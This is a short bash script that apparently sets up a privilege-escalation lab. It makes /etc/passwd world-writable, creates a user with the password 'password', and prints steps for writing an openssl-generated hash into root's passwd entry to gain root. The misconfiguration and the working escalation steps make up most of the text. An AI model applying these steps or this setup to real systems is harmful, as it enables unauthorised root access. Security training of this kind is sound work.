#!/bin/bash

echo "Setting up bad Linux sysadmin..."
chmod 777 /etc/passwd 

echo "Changing to user1..."
adduser -S user1 -u 321 -D -s /bin/bash
echo user1:password | chpasswd
su user1
clear
cd $HOME 
whoami

echo "Ready!"
echo "Step 1: Before we add our new user, first create a password hash. You do this with: openssl passwd -1 salt [salt] [password]. Lets create one with hash 'new' and password '123456'"
echo "Step 2: Now take over root. Copy your hash and replace the x on line root:x:0:0:root:/root:/bin/ash"
echo "Step 3: Type su and then the password '123456', you should be root"
 
